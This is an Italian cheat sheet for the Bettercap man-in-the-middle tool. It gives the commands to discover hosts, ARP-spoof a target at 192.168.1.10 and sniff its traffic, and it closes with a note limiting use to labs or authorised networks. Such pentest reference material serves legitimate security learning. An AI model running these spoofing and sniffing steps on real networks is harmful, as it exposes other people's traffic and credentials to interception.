# Bettercap - attacchi Man-in-the-Middle

## Avvio
```
sudo bettercap -iface eth0
```
Nel prompt:
```
net.probe on            # scopre gli host
net.show                # mostra gli host trovati
set arp.spoof.targets 192.168.1.10
arp.spoof on            # avvia lo spoofing ARP
net.sniff on            # intercetta il traffico
```

## Legale
MITM solo in laboratorio o su reti autorizzate: e' altamente intrusivo.
